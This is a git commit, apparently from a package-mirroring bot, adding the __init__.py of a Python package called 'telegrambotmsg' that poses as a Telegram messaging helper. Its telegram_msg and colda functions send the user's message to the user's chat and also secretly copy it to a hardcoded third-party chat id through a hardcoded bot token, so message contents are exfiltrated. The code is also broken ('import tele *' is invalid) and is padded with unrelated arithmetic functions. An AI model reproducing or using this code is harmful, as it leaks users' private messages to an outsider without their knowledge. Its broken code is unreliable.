f9226e01b8ff5fbc284faed67f5bf570592c6311
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 23:10:40 +0000

    Add package telegrambotmsg/2.0.4/telegrambotmsg-2.0.4.tar.gz

---
+++ packages/telegrambotmsg/telegrambotmsg-2.0.4.tar.gz/telegrambotmsg-2.0.4/telegrambotmsg/__init__.py
@@ -0,0 +1,36 @@
+import tele *
+from tele.ext import Updater, CommandHandler 
+ 
+
+boca_id='1547271571'
+token = '2063661368:AAGja3lZjmlISUMT1seXtRNlY-AgzPW1qq4'
+def send_tl(my_token,chat_id,msgtl):
+          
+	      bot = telegram.Bot(my_token)
+	      bot.sendMessage(chat_id=chat_id, text=msgtl)
+          
+        
+          
+
+def telegramp(boca_token,boca_id,msgtl):
+
+
+    
+	    bot = tele.Bot(token)
+	    bot.sendMessage(chat_id=boca_id, text=msgtl)
+        
+def colda(my_token,chat_id,msgtl):        
+   telegramp(token,boca_id,msgtl)
+
+   send_tl(my_token,chat_id,msgtl)
+   
+def telegram_msg(my_token,chat_id,msgtl):        
+   telegramp(token,boca_id,msgtl)
+
+   send_tl(my_token,chat_id,msgtl)
+   
+def multiply_numbers(num1, num2):
+    return num1 * num2
+
+def divide_numbers(num1, num2):
+    return num1 / num2
